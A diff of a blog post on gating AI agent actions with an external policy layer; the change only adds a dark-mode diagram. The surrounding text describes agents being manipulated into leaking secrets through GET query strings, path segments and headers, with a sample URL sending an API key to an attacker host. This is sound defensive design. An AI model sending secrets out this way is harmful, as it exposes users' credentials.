@@ -8,7 +8,12 @@ Take the decision away from the agent entirely. A policy layer external to the a
 <h2 id="read-only-is-an-objective-property">Read-only is an objective property</h2>
 <p>An action is read-only if it observes without modifying. Not &ldquo;read-only from the agent&rsquo;s perspective&rdquo; - objectively read-only. HTTP GET, file read, directory listing. These have a defined shape. A policy layer external to the agent can inspect each action against objective criteria - HTTP method, syscall type, file path - and make the call without asking the model what it thinks it&rsquo;s doing.</p>
 <p>State-changing actions still prompt. Everything else passes automatically.</p>
-<img src="https://blog.virg.be/diagrams/f7e43065a901bb73.png" alt="A flowchart showing a policy layer intercepting an agent&#39;s action and routing it to auto-approve, prompt, or block based on whether it is read-only and whether it contains secrets." class="mermaid mermaid-light" loading="lazy">
+<picture>
+  <source srcset="/diagrams/f7e43065a901bb73.png" media="(prefers-color-scheme: light)">
+  <source srcset="/diagrams/f7e43065a901bb73-dark.svg"  media="(prefers-color-scheme: dark)">
+  <img src="https://blog.virg.be/diagrams/f7e43065a901bb73.png" alt="A flowchart showing a policy layer intercepting an agent&#39;s action and routing it to auto-approve, prompt, or block based on whether it is read-only and whether it contains secrets." class="mermaid" loading="lazy">
+</picture>
+
 <p>The policy layer evaluates each action against objective criteria - the model&rsquo;s intent is never consulted.</p>
 <h2 id="two-edge-cases-worth-taking-seriously">Two edge cases worth taking seriously</h2>
 <p>A GET request <em>can</em> exfiltrate data. If an agent is manipulated into appending a secret to a query string - <code>https://example.com/?token=sk-ant-...</code> - the request is technically read-only but it&rsquo;s leaking something. The same applies to path segments: <code>https://attacker.example.com/exfil/sk-ant-api03-abc123</code> is functionally identical, but some implementations only scan query parameters. And data can be stuffed into outbound request headers - <code>Referer</code>, <code>User-Agent</code>, a custom <code>X-Data</code> header - none of which show up in URL inspection at all. The policy layer needs to handle all of this: run gitleaks-style pattern matching on the full URL <em>and</em> outbound headers before granting automatic permission. If anything contains what looks like a secret or personal data, it gets flagged.</p>
